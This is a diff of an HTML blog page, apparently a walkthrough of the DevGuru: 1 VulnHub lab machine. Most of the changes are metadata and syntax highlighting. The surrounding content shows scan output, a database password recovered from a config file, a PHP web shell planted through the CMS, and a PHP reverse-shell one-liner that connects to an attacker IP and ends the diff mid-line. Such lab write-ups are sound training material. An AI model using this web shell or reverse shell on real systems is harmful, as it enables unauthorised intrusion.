@@ -5,9 +5,9 @@
     <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="generator" content="Hugo 0.68.3 with theme Tranquilpeak 0.4.8-BETA">
+<meta name="generator" content="Hugo 0.85.0 with theme Tranquilpeak 0.4.8-BETA">
 <meta name="author" content="Tiago Tavares">
-<meta name="keywords" content="vulnhub">
+<meta name="keywords" content="vulnhub, cybersecurity, information security, running, hacking, programming, offensive security, red team">
 <meta name="description" content="DevGuru: 1 - A Vulnhub vulnerable machine walkthrough.">
 
 
@@ -49,10 +49,10 @@
 
 <meta name="twitter:card" content="summary">
 
-  <meta name="twitter:site" content="@tiagotavares_">
+  <meta name="twitter:site" content="@0xtiago">
 
 
-  <meta name="twitter:creator" content="@tiagotavares_">
+  <meta name="twitter:creator" content="@0xtiago">
 
 
 
@@ -103,7 +103,6 @@ if (!doNotTrack) {
 	ga('send', 'pageview');
 }
 </script>
-
     
     
   </head>
@@ -201,7 +200,7 @@ if (!doNotTrack) {
       
   <li class="sidebar-button">
     
-      <a class="sidebar-button-link " href="https://github.com/tiagotvrs" target="_blank" rel="noopener">
+      <a class="sidebar-button-link " href="https://github.com/0xtiago" target="_blank" rel="noopener">
     
       <i class="sidebar-button-icon fa fa-lg fa-github"></i>
       
@@ -358,7 +357,7 @@ PORT     STATE SERVICE VERSION
 |   GetRequest: 
 |     HTTP/1.0 <span style="color:#ae81ff">200</span> OK
 |     Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
-|     Set-Cookie: lang<span style="color:#f92672">=</span>en-US; Path<span style="color:#f92672">=</span>/; Max-Age<span style="color:#f92672">=</span>2147483647
+|     Set-Cookie: lang<span style="color:#f92672">=</span>en-US; Path<span style="color:#f92672">=</span>/; Max-Age<span style="color:#f92672">=</span><span style="color:#ae81ff">2147483647</span>
 |     Set-Cookie: i_like_gitea<span style="color:#f92672">=</span>60a60f9a3f2071e6; Path<span style="color:#f92672">=</span>/; HttpOnly
 |     Set-Cookie: _csrf<span style="color:#f92672">=</span>gZLNwT-DkBTkP2Femsn0l4c6rU46MTYwNzYxMDI5MDY1NDc0OTg2Mg; Path<span style="color:#f92672">=</span>/; Expires<span style="color:#f92672">=</span>Fri, <span style="color:#ae81ff">11</span> Dec <span style="color:#ae81ff">2020</span> 14:24:50 GMT; HttpOnly
 |     X-Frame-Options: SAMEORIGIN
@@ -395,42 +394,42 @@ PORT     STATE SERVICE VERSION
 |_    &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;description&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Gitea (Git with a c
 </span><span style="color:#e6db74">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 </span><span style="color:#e6db74">SF-Port8585-TCP:V=7.91%I=7%D=12/10%Time=5FD22FB2%P=x86_64-pc-linux-gnu%r(G
-</span><span style="color:#e6db74">SF:enericLines,67,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20
-SF:text/plain;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\</span>
-SF:x20Request<span style="color:#e6db74">&#34;)%r(GetRequest,2A02,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20200<span style="color:#ae81ff">\x</span>20OK<span style="color:#ae81ff">\r\n</span>Content-Type:
+</span><span style="color:#e6db74">SF:enericLines,67,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+SF:text/plain;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:x20Request<span style="color:#e6db74">&#34;)%r(GetRequest,2A02,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20200<span style="color:#ae81ff">\x</span>20OK<span style="color:#ae81ff">\r\n</span>Content-Type:
 SF:<span style="color:#ae81ff">\x</span>20text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>UTF-8<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span>en-US;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/
 SF:;<span style="color:#ae81ff">\x</span>20Max-Age<span style="color:#f92672">=</span>2147483647<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20i_like_gitea<span style="color:#f92672">=</span>60a60f9a3f2071e6
 SF:;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20HttpOnly<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20_csrf<span style="color:#f92672">=</span>gZLNwT-DkBTkP2Femsn0l4
 SF:c6rU46MTYwNzYxMDI5MDY1NDc0OTg2Mg;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20Expires<span style="color:#f92672">=</span>Fri,<span style="color:#ae81ff">\x</span>2011<span style="color:#ae81ff">\x</span>20D
 SF:ec<span style="color:#ae81ff">\x</span>202020<span style="color:#ae81ff">\x</span>2014:24:50<span style="color:#ae81ff">\x</span>20GMT;<span style="color:#ae81ff">\x</span>20HttpOnly<span style="color:#ae81ff">\r\n</span>X-Frame-Options:<span style="color:#ae81ff">\x</span>20SAMEO
 SF:RIGIN<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2010<span style="color:#ae81ff">\x</span>20Dec<span style="color:#ae81ff">\x</span>202020<span style="color:#ae81ff">\x</span>2014:24:50<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n\r\n</span>&lt;
-SF:!DOCTYPE<span style="color:#ae81ff">\x</span>20html&gt;<span style="color:#ae81ff">\n</span>&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en-US<span style="color:#ae81ff">\&#34;\x</span>20class<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>theme-<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n</span>&lt;head<span style="color:#ae81ff">\</span>
-SF:x20data-suburl<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>utf-8<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>
+SF:!DOCTYPE<span style="color:#ae81ff">\x</span>20html&gt;<span style="color:#ae81ff">\n</span>&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en-US<span style="color:#ae81ff">\&#34;\x</span>20class<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>theme-<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n</span>&lt;head<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:x20data-suburl<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>utf-8<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>
 SF:viewport<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>width<span style="color:#f92672">=</span>device-width,<span style="color:#ae81ff">\x</span>20initial-scale<span style="color:#f92672">=</span>1<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;m
 SF:eta<span style="color:#ae81ff">\x</span>20http-equiv<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>x-ua-compatible<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>ie<span style="color:#f92672">=</span>edge<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;title
 SF:&gt;<span style="color:#ae81ff">\x</span>20Gitea:<span style="color:#ae81ff">\x</span>20Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20cup<span style="color:#ae81ff">\x</span>20of<span style="color:#ae81ff">\x</span>20tea<span style="color:#ae81ff">\x</span>20&lt;/title&gt;<span style="color:#ae81ff">\n\t</span>&lt;lin
 SF:k<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>manifest<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/manifest<span style="color:#ae81ff">\.</span>json<span style="color:#ae81ff">\&#34;\x</span>20crossorigin<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>use-
 SF:credentials<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>theme-color<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#75715e">#6cc644\&#34;&gt;</span>
-SF:<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>author<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Gitea<span style="color:#ae81ff">\x</span>20-<span style="color:#ae81ff">\x</span>20Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20
+SF:<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>author<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Gitea<span style="color:#ae81ff">\x</span>20-<span style="color:#ae81ff">\x</span>20Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
 SF:a<span style="color:#ae81ff">\x</span>20cup<span style="color:#ae81ff">\x</span>20of<span style="color:#ae81ff">\x</span>20tea<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>description<span style="color:#ae81ff">\&#34;\x</span>20conte
 SF:nt<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Gitea<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\(</span>Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20cup<span style="color:#ae81ff">\x</span>20of<span style="color:#ae81ff">\x</span>20tea<span style="color:#ae81ff">\)\x</span>20is<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20pa
 SF:inless<span style="color:#e6db74">&#34;)%r(HTTPOptions,212A,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20404<span style="color:#ae81ff">\x</span>20Not<span style="color:#ae81ff">\x</span>20Found<span style="color:#ae81ff">\r\n</span>Conten
-SF:t-Type:<span style="color:#ae81ff">\x</span>20text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>UTF-8<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span>en-US;<span style="color:#ae81ff">\x</span>2
+SF:t-Type:<span style="color:#ae81ff">\x</span>20text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>UTF-8<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span>en-US;<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
 SF:0Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20Max-Age<span style="color:#f92672">=</span>2147483647<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20i_like_gitea<span style="color:#f92672">=</span>5dba56f95
 SF:3e777cd;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20HttpOnly<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20_csrf<span style="color:#f92672">=</span>qFWDFJyuERvO3K1
-SF:gxAiy1eV2lG86MTYwNzYxMDI5MDc3MDAyMjI4Ng;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20Expires<span style="color:#f92672">=</span>Fri,<span style="color:#ae81ff">\x</span>20
+SF:gxAiy1eV2lG86MTYwNzYxMDI5MDc3MDAyMjI4Ng;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20Expires<span style="color:#f92672">=</span>Fri,<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
 SF:11<span style="color:#ae81ff">\x</span>20Dec<span style="color:#ae81ff">\x</span>202020<span style="color:#ae81ff">\x</span>2014:24:50<span style="color:#ae81ff">\x</span>20GMT;<span style="color:#ae81ff">\x</span>20HttpOnly<span style="color:#ae81ff">\r\n</span>X-Frame-Options:<span style="color:#ae81ff">\x</span>
 SF:20SAMEORIGIN<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2010<span style="color:#ae81ff">\x</span>20Dec<span style="color:#ae81ff">\x</span>202020<span style="color:#ae81ff">\x</span>2014:24:50<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r</span>
-SF:<span style="color:#ae81ff">\n\r\n</span>&lt;!DOCTYPE<span style="color:#ae81ff">\x</span>20html&gt;<span style="color:#ae81ff">\n</span>&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en-US<span style="color:#ae81ff">\&#34;\x</span>20class<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>theme-<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\</span>
-SF:n&lt;head<span style="color:#ae81ff">\x</span>20data-suburl<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>utf-8<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20
+SF:<span style="color:#ae81ff">\n\r\n</span>&lt;!DOCTYPE<span style="color:#ae81ff">\x</span>20html&gt;<span style="color:#ae81ff">\n</span>&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en-US<span style="color:#ae81ff">\&#34;\x</span>20class<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>theme-<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:n&lt;head<span style="color:#ae81ff">\x</span>20data-suburl<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>utf-8<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
 SF:name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>viewport<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>width<span style="color:#f92672">=</span>device-width,<span style="color:#ae81ff">\x</span>20initial-scale<span style="color:#f92672">=</span>1<span style="color:#ae81ff">\&#34;</span>
-SF:&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20http-equiv<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>x-ua-compatible<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>ie<span style="color:#f92672">=</span>edge<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\</span>
-SF:t&lt;title&gt;Page<span style="color:#ae81ff">\x</span>20Not<span style="color:#ae81ff">\x</span>20Found<span style="color:#ae81ff">\x</span>20-<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20Gitea:<span style="color:#ae81ff">\x</span>20Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20
+SF:&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20http-equiv<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>x-ua-compatible<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>ie<span style="color:#f92672">=</span>edge<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\
+</span><span style="color:#ae81ff"></span>SF:t&lt;title&gt;Page<span style="color:#ae81ff">\x</span>20Not<span style="color:#ae81ff">\x</span>20Found<span style="color:#ae81ff">\x</span>20-<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20Gitea:<span style="color:#ae81ff">\x</span>20Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
 SF:cup<span style="color:#ae81ff">\x</span>20of<span style="color:#ae81ff">\x</span>20tea<span style="color:#ae81ff">\x</span>20&lt;/title&gt;<span style="color:#ae81ff">\n\t</span>&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>manifest<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/ma
 SF:nifest<span style="color:#ae81ff">\.</span>json<span style="color:#ae81ff">\&#34;\x</span>20crossorigin<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>use-credentials<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>t
 SF:heme-color<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#75715e">#6cc644\&#34;&gt;\n\t&lt;meta\x20name=\&#34;author\&#34;\x20con</span>
 SF:tent<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Gitea<span style="color:#ae81ff">\x</span>20-<span style="color:#ae81ff">\x</span>20Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20cup<span style="color:#ae81ff">\x</span>20of<span style="color:#ae81ff">\x</span>20tea<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\t</span>&lt;m
-SF:eta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>description<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Gitea<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\(</span>Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>2
+SF:eta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>description<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Gitea<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\(</span>Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
 SF:0c<span style="color:#e6db74">&#34;);
 </span><span style="color:#e6db74">MAC Address: 08:00:27:FF:2C:BE (Oracle VirtualBox virtual NIC)
 </span><span style="color:#e6db74">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
@@ -462,7 +461,7 @@ SF:0c<span style="color:#e6db74">&#34;);
 ---------------------------------------------------------------------------
 + Target IP:          192.168.0.63
 + Target Hostname:    192.168.0.63
-+ Target Port:        80
++ Target Port:        <span style="color:#ae81ff">80</span>
 + Start Time:         2020-12-10 11:37:30 <span style="color:#f92672">(</span>GMT-3<span style="color:#f92672">)</span>
 ---------------------------------------------------------------------------
 + Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
@@ -489,7 +488,7 @@ SF:0c<span style="color:#e6db74">&#34;);
 ---------------------------------------------------------------------------
 + Target IP:          192.168.0.63
 + Target Hostname:    192.168.0.63
-+ Target Port:        8585
++ Target Port:        <span style="color:#ae81ff">8585</span>
 + Start Time:         2020-12-10 11:37:50 <span style="color:#f92672">(</span>GMT-3<span style="color:#f92672">)</span>
 ---------------------------------------------------------------------------
 + Server: No banner retrieved
@@ -527,8 +526,8 @@ ________________________________________________
  :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
  :: Follow redirects : false
  :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
+ :: Timeout          : <span style="color:#ae81ff">10</span>
+ :: Threads          : <span style="color:#ae81ff">40</span>
  :: Matcher          : Response status: 200,204,301,302,307,401,403
 ________________________________________________
 
@@ -565,8 +564,8 @@ ________________________________________________
  :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
  :: Follow redirects : false
  :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
+ :: Timeout          : <span style="color:#ae81ff">10</span>
+ :: Threads          : <span style="color:#ae81ff">40</span>
  :: Matcher          : Response status: 200,204,301,302,307,401,403
 ________________________________________________
 
@@ -605,18 +604,18 @@ ls
 <p>Looking for password in <code>config</code> folder.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">fgrep -r password config/
 </code></pre></div><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055824/blog/image-20201210211308719_z9xvmi.png" alt="image-20201210211308719"></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&#39;mysql&#39; =&gt; [
-            &#39;driver&#39;     =&gt; &#39;mysql&#39;,
-            &#39;engine&#39;     =&gt; &#39;InnoDB&#39;,
-            &#39;host&#39;       =&gt; &#39;localhost&#39;,
-            &#39;port&#39;       =&gt; 3306,
-            &#39;database&#39;   =&gt; &#39;octoberdb&#39;,
-            &#39;username&#39;   =&gt; &#39;october&#39;,
-            &#39;password&#39;   =&gt; &#39;SQ66EBYx4GT3byXH&#39;,
-            &#39;charset&#39;    =&gt; &#39;utf8mb4&#39;,
-            &#39;collation&#39;  =&gt; &#39;utf8mb4_unicode_ci&#39;,
-            &#39;prefix&#39;     =&gt; &#39;&#39;,
-            &#39;varcharmax&#39; =&gt; 191,
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#e6db74">&#39;mysql&#39;</span> <span style="color:#f92672">=&gt;</span> [
+            <span style="color:#e6db74">&#39;driver&#39;</span>     <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;mysql&#39;</span>,
+            <span style="color:#e6db74">&#39;engine&#39;</span>     <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;InnoDB&#39;</span>,
+            <span style="color:#e6db74">&#39;host&#39;</span>       <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;localhost&#39;</span>,
+            <span style="color:#e6db74">&#39;port&#39;</span>       <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">3306</span>,
+            <span style="color:#e6db74">&#39;database&#39;</span>   <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;octoberdb&#39;</span>,
+            <span style="color:#e6db74">&#39;username&#39;</span>   <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;october&#39;</span>,
+            <span style="color:#e6db74">&#39;password&#39;</span>   <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;SQ66EBYx4GT3byXH&#39;</span>,
+            <span style="color:#e6db74">&#39;charset&#39;</span>    <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;utf8mb4&#39;</span>,
+            <span style="color:#e6db74">&#39;collation&#39;</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;utf8mb4_unicode_ci&#39;</span>,
+            <span style="color:#e6db74">&#39;prefix&#39;</span>     <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;&#39;</span>,
+            <span style="color:#e6db74">&#39;varcharmax&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">191</span>,
         ],
 
 </code></pre></div><p>Look at the path <code>adminer.php</code>, sounds interesting.</p>
@@ -643,9 +642,9 @@ ls
 <p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055827/blog/image-20201214111732338_gt85yo.png" alt="image-20201214111732338"></p>
 <p>Now insert the malicious code.</p>
 <p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055826/blog/image-20201214121229631_ygjwtj.png" alt="image-20201214121229631"></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">function onStart()
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">onStart</span>()
 {
-    $this-&gt;page[&#34;PoisonVar&#34;] = system($_GET[&#39;cmd&#39;]);
+    $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">page</span>[<span style="color:#e6db74">&#34;PoisonVar&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
 }
 </code></pre></div><p>Save it and run a command through cmd.</p>
 <p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055826/blog/image-20201214112322377_l94gtz.png" alt="image-20201214112322377"></p>
@@ -653,7 +652,7 @@ ls
 <p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055826/blog/image-20201214112351520_wjfmrq.png" alt="image-20201214112351520"></p>
 <p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055827/blog/image-20201214120904737_ulaeyr.png" alt="image-20201214120904737"></p>
 <p>Time to inject a command in cmd and get our first shell.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">php -r &#39;$sock=fsockopen(&#34;192.168.0.64&#34;,1234);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39;
